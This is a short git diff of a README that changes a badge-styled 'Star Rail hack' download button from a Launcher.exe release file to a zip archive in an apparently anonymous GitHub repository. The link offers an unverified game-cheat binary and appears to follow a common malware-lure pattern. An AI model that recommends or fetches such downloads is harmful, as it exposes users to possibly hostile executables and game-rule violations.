@@ -1,6 +1,6 @@
 # Download
 
-[<img src="https://img.shields.io/badge/DOWNLAOD_BUTTON-STAR_RAIL_HACK-blue?style=for-the-badge">](https://github.com/maryman3/Star-Rail-Hyper/releases/download/starrail/Launcher.exe)
+[<img src="https://img.shields.io/badge/DOWNLAOD_BUTTON-STAR_RAIL_HACK-blue?style=for-the-badge">](https://github.com/maryman3/Star-Rail-Hyper/releases/download/starrail/Hyper_STARRAIL.zip)
 
 
 # Features
